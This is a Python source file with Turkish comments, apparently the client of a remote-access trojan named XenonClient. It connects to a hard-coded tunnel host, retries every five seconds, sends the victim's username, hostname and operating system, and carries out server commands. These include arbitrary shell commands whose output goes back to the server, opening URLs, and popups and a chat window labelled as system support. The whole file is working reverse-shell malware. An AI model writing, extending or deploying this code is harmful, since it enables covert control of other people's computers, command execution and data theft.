import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net"  # Test için localhost, gerçekte Sunucu IP'si
PORT = 8212
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None

    def get_sys_info(self):
        """Sunucuya gönderilecek kimlik bilgileri."""
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "country": "TR",
            "os": f"{platform.system()} {platform.release()}"
        })

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except:
                time.sleep(5) # Bağlantı koparsa 5 saniyede bir yeniden dene

    def listen(self):
        while True:
            try:
                data = self.sock.recv(8192).decode("utf-8")
                if not data: break

                if data.startswith("msg|"):
                    msg = data.split("|")[1]
                    threading.Thread(target=lambda: messagebox.showinfo("Sistem Duyurusu", msg)).start()

                elif data == "chat_open":
                    threading.Thread(target=self.gui_chat).start()

                elif data.startswith("chat_msg|"):
                    msg = data.split("|")[1]
                    if self.chat_box:
                        self.chat_box.config(state="normal")
                        self.chat_box.insert(tk.END, f"DESTEK: {msg}\n")
                        self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)

                elif data == "chat_close":
                    if self.chat_win: self.chat_win.destroy()

                elif data == "beep":
                    if platform.system() == "Windows":
                        import winsound
                        winsound.Beep(1000, 400)

                elif data.startswith("open_url|"):
                    webbrowser.open(data.split("|")[1])

                elif data.startswith("shell|"):
                    cmd = data.split("|")[1]
                    threading.Thread(target=self.run_shell, args=(cmd,)).start()

            except: break
        self.sock.close()

    def run_shell(self, cmd):
        try:
            # Komutu çalıştır ve çıktıyı al
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            res = stdout.decode("cp857", errors="replace") + stderr.decode("cp857", errors="replace")
            self.sock.send(f"shell_res|{res}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))

    def gui_chat(self):
        if self.chat_win: return
        self.chat_win = tk.Tk(); self.chat_win.title("Sistem Canlı Destek"); self.chat_win.geometry("350x450")
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled", font=("Arial", 10))
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_to_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled"); ent.delete(0, tk.END)
                try: self.sock.send(f"chat|{m}".encode("utf-8"))
                except: pass
        
        ent.bind("<Return>", send_to_srv)
        self.chat_win.protocol("WM_DELETE_WINDOW", lambda: [setattr(self, 'chat_win', None), self.chat_win.destroy()])
        self.chat_win.mainloop()
        self.chat_win = None

if __name__ == "__main__":
    XenonClient(HOST, PORT).connect()
